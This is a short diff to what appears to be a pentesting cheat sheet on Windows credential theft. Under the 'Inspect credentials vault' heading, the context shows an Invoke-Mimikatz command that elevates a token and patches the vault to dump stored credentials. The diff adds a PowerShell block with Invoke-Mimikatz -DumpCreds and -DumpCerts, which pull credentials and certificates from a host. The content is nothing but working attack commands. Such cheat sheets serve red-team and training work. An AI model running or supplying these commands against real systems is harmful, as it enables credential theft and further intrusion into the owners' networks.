@@ -247,4 +247,7 @@ Inspect credentials vault
 Invoke-Mimikatz -Command '"token::elevate" "vault::cred /patch"'
 ```
 
+```powershell
+Invoke-Mimikatz -DumpCreds
+Invoke-Mimikatz -DumpCerts
 ```
